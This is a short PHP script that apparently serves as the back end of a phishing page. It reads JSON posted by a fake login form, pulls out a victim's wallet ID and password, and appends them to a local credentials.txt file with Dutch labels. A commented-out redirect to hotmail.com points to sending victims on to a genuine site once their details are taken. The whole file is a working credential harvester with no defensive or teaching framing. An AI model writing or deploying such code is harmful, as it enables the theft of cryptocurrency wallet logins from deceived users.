<?php

// Uncomment if page does not redirect with javascript
/* header('Location: https://hotmail.com/'); */

// Write credentials to file
function write_credentials ($walletid, $password) {
	file_put_contents('credentials.txt', "Wallet-ID: {$walletid}\nWachtwoord: {$password}\n", FILE_APPEND);
}

// Parse JSON data
$data = json_decode(file_get_contents('php://input'), true);
if (isset($data['walletid']) && isset($data['password'])) {
	write_credentials($data['walletid'], $data['password']);
} else {
	write_credentials('Onbekend', 'Onbekend');
}

//
exit;
